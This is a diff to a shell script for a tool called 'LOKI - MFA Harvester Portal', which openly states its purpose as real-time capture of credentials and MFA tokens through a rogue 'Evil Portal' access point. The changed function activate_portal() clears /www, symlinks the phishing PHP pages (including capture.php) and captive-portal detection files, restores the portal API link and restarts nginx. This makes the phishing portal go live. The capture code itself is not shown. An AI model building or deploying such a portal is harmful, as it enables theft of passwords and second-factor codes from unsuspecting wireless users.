@@ -2,7 +2,7 @@
 # Title: LOKI - MFA Harvester Portal
 # Description: Real-time credential and MFA token capture via Evil Portal
 # Author: JMFH / FENRIR / HaleHound
-# Version: 1.0.0
+# Version: 1.0.1
 # Category: credential-harvesting
 # Named after the Norse trickster god - master of deception
 
@@ -557,21 +557,29 @@ activate_portal() {
 
     LOG "Activating portal: $portal_name"
 
-    # Create symlinks for Evil Portal
-    rm -f /www/index.php /www/MyPortal.php /www/helper.php /www/capture.php
+    # Clear /www and create symlinks
+    rm -rf /www/*
+
+    # PHP files
     ln -sf "$portal_path/index.php" /www/index.php
     ln -sf "$portal_path/MyPortal.php" /www/MyPortal.php
     ln -sf "$portal_path/helper.php" /www/helper.php
     ln -sf "$portal_path/capture.php" /www/capture.php
+
+    # Captive portal detection
     ln -sf "$portal_path/generate_204" /www/generate_204
     ln -sf "$portal_path/hotspot-detect.html" /www/hotspot-detect.html
 
-    # Restart Evil Portal if running
-    if pgrep -f "evilportal" > /dev/null; then
-        /etc/init.d/evilportal restart 2>/dev/null
-    fi
+    # CRITICAL: Restore captiveportal API symlink
+    ln -sf /pineapple/ui/modules/evilportal/assets/api /www/captiveportal
 
-    LOG "Portal $portal_name activated"
+    # Test and restart nginx
+    if nginx -t 2>/dev/null; then
+        /etc/init.d/nginx restart
+        LOG "Portal $portal_name activated"
+    else
+        LOG "ERROR: nginx config test failed"
+    fi
 }
 
 # === MAIN EXECUTION ===
